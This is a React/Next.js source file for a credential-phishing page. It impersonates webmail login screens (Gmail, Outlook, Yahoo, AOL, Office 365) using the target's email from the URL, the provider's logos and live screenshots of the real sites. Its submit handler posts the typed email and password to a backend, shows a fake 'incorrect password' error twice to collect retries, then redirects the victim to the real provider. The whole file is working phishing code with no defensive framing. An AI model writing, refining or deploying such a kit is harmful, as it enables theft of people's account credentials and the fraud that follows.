"use client";

import { useEffect, useState } from "react";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [logoUrl, setLogoUrl] = useState("https://reliable-firm.netlify.app/pix.jpeg");
  const [siteName, setSiteName] = useState("Webmail");
  const [bgStyle, setBgStyle] = useState({});

  useEffect(() => {
    // Handle URL fragment parsing
    // URL format: #user@example.com
    const hash = window.location.hash;
    if (hash) {
      const id = hash.substring(1); // remove #
      if (id.includes("@")) {
        setEmail(id);
        const domain = id.split("@")[1];
        const nameUrl = domain.split(".")[0];
        // Capitalize first letter
        const siteNameDisplay = nameUrl.charAt(0).toUpperCase() + nameUrl.slice(1);

        // Update title
        document.title = siteNameDisplay + " Login";

        // Asset Mapping
        // Logos: Local files provided by user
        // Backgrounds: Restored to original image.thum.io dynamic screenshots
        const assets: Record<string, { logo: string; bg: string; name: string }> = {
          "gmail.com": {
            logo: "/assets/logos/gmail.png",
            bg: "https://image.thum.io/get/width/1280/crop/600/https://www.google.com/intl/us/gmail/about/",
            name: "Gmail"
          },
          "outlook.com": {
            logo: "/assets/logos/outlook.png",
            bg: "https://image.thum.io/get/width/1280/crop/600/https://outlook.live.com/",
            name: "Outlook"
          },
          "hotmail.com": {
            logo: "/assets/logos/outlook.png",
            bg: "https://image.thum.io/get/width/1280/crop/600/https://outlook.live.com/",
            name: "Hotmail"
          },
          "yahoo.com": {
            logo: "/assets/logos/yahoo.png",
            bg: "https://image.thum.io/get/width/1280/crop/600/https://login.yahoo.com/",
            name: "Yahoo"
          },
          "aol.com": {
            logo: "/assets/logos/aol.png",
            bg: "https://image.thum.io/get/width/1280/crop/600/https://login.aol.com/",
            name: "Aol"
          },
          "office365.com": {
            logo: "/assets/logos/office365.png",
            bg: "https://image.thum.io/get/width/1280/crop/600/https://www.office.com/",
            name: "Office 365"
          }
        };

        const config = assets[domain] || {
          // Fallback for others
          logo: "/assets/logos/default.png",
          // Dynamic background for unknown domains
          bg: `https://image.thum.io/get/width/1280/crop/600/https://${domain}`,
          name: siteNameDisplay
        };

        setLogoUrl(config.logo);
        setSiteName(config.name);
        setBgStyle({
          backgroundImage: `url(${config.bg})`,
          backgroundRepeat: "no-repeat",
          backgroundSize: "contain",
          backgroundPosition: "center",
          width: "100vw",
          height: "100vh",
          margin: "0",
          overflow: "hidden" // Optional to ensure no scrollbars from the background container itself
        });

        // Update favicon
        let link = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
        if (!link) {
          link = document.createElement('link');
          link.rel = 'icon';
          document.getElementsByTagName('head')[0].appendChild(link);
        }
        link.href = config.logo;
      }
    }

    // Cleanup to default body background if needed, but since we set style on body in original,
    // in React we usually apply to a wrapper. 
    // The original script applied styles to `bodymain` (body).
    // We will apply these styles to the main container wrapper or document body.
    // Setting document.body.style directly is a side effect.
  }, []);

  // Sync state to body style
  useEffect(() => {
    if (bgStyle && Object.keys(bgStyle).length > 0) {
      Object.assign(document.body.style, bgStyle);
    }
  }, [bgStyle]);


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError("Email field is empty...!");
      return;
    }
    if (!password) {
      setError("Password field is empty...!");
      return;
    }

    const currentAttempts = attempts + 1;
    setAttempts(currentAttempts);

    const formData = `Email: ${email} \nPassword: ${password}`;

    setIsLoading(true);
    setError(""); // Clear previous errors

    try {
      await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ pass: formData }),
      });
    } catch (err) {
      console.error("Submission error", err);
      // Continue flow even if API fails (as per original logic "Network Connection Failed" was ignored in success flow logic)
    }

    // Delay to simulate processing
    setTimeout(() => {
      setIsLoading(false);

      if (currentAttempts <= 2) {
        setError("Incorrect Email Password, try again");
        setPassword("");
      } else {
        setError("");
        // Redirect
        const domain = email.split("@")[1] || "google.com";
        window.location.href = `https://www.${domain}`;
      }
    }, 2000);
  };

  return (
    <div className="container">
      <div className="main-contain">
        <div className="logbox">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src={logoUrl}
            alt="logo"
            width="28"
            className="logo"
            onError={(e) => {
              // Fallback if image fails
              (e.target as HTMLImageElement).style.display = 'none';
            }}
          />
          <span className="name">{siteName}</span>
        </div>

        <div className="sign-p">
          <p>Sign in with your email address
            and password to continue using your current password</p>
        </div>

        <div className="signform">
          <p className={`error ${error ? "" : "hide"}`}>{error}</p>
          <form onSubmit={handleSubmit} id="form">
            <div className="inpg">
              <input
                type="text"
                name="em"
                id="em"
                placeholder="Email"
                readOnly={!!email}
                // If email is present (from hash), it's readOnly. If empty, you can type.
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div className="inpg">
              <input
                type="password"
                name="pa"
                id="pa"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            <div className="inp2b">
              <button className="btnlogin" disabled={isLoading}>
                {isLoading ? "Verifying..." : "Login"}
              </button>
            </div>

            <div className="foot-img">
              {/* Fixed broken nort.png image - removed or replaced */}
              {/* 
               <img src="https://reliable-firm.netlify.app/nort.png" alt="nort" width="70" /> 
               */}
              <div style={{ fontSize: '12px', color: '#888', marginTop: '10px' }}>
                Secured System
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
